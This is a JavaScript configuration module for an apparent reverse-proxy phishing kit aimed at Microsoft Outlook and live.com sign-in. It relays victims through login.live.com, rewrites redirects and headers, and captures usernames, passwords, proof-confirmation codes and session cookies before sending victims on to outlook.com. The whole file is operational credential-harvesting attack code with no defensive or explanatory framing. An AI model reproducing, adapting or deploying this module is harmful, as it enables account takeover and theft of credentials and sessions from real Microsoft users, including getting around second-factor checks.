/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')

// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** Important Defaults */

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {

        super(proxyResp, browserEndPoint)
        this.regexes = [
             {
                reg: /https:\/\/account.live.com\/identity\/confirm/igm, // Google chrome on windows fix
                replacement: '/identity/confirm/'
             },
        ]
    }


    processResponse() {
        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }

        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
            const rLocation = extRedirectObj.url

            if (rLocation.startsWith('https://account.live.com') || rLocation.startsWith('https://account.microsoft.com')) {
                return this.afterEmailPath()
            }
        }

        let appHeaders = this.browserEndPoint.getHeaders()['set-cookie'] || []
        appHeaders = appHeaders.filter(appSingleHeader => {
            return !appSingleHeader.startsWith('OParams=')
        })
        this.browserEndPoint.setHeader('set-cookie', appHeaders)


        // this.browserEndPoint.removeHeader('content-security-policy')
        let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                    }
                }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }

    afterEmailPath() {
        this.browserEndPoint.setHeader('location', '/auth0/outlook/owa2')
        this.browserEndPoint.end('')
    }


}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }

    execute(clientContext) {

        // Check for redirect
        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null) {
            if (redirectToken.url.startsWith('https://login.live.com/oauth20_authorize.srf?')) {
                clientContext.currentDomain = 'login.live.com'
                this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }

            if (redirectToken.url.startsWith('https://login.microsoftonline.com/common/oauth2/nativeclient')) {
                super.sendClientData(clientContext, {})
                return super.exitLink('https://outlook.com')
            }
        }
    

        return super.execute(clientContext)

    }
}




const configExport = {
    CURRENT_DOMAIN: 'login.live.com',
    
    SCHEME: 'outlook',

    START_PATH: '/', 

    AUTOGRAB_CODE: 'username',


    COOKIE_PATH: ['/auth0/outlook/owa2', '/common/SAS/ProcessAuth', '/ping/v5767687'],

    EXIT_TRIGGER_PATH: ['/auth0/outlook/owa2'],

    EXIT_URL: 'https://outlook.com',

    EXTRA_COMMANDS: [
        
        {
            path: '/identity/confirm',
            command: 'CHANGE_DOMAIN',
            command_args: {
                new_domain: 'account.live.com',
                persistent: true,
                },
        },

        {
            path: '/GetCredentialType.srf.*',
            command: 'DONOT_SEND_INFO',
            command_args: {},
        },

    ],

    EXTERNAL_FILTERS: [
        'account.live.com',
        'login.live.com'
    ],

    PRE_HANDLERS:[],

    PROXY_REQUEST: 'DEFAULT',
    
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        loginUserName: {
            params: ['username'],
            hosts: ['login.live.com'],
        },

        loginID: {
            method: 'POST',
            params: ['login'],
            urls: '',
            hosts: ['login.live.com'],
        },

        loginPassword: {
            method: 'POST',
            params: ['passwd'],
            urls: '',
            hosts: ['login.live.com'],
        },

        proofConfirm: {
            method: 'POST',
            params: ['ProofConfirmation'],
            urls: '',
            hosts: ['login.live.com'],
        },

    },
    
     //MODULE OPTIONS 
     MODULE_ENABLED: true,

     MODULE_OPTIONS: {
         startPath: this.START_PATH,
         exitLink: '',
     },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport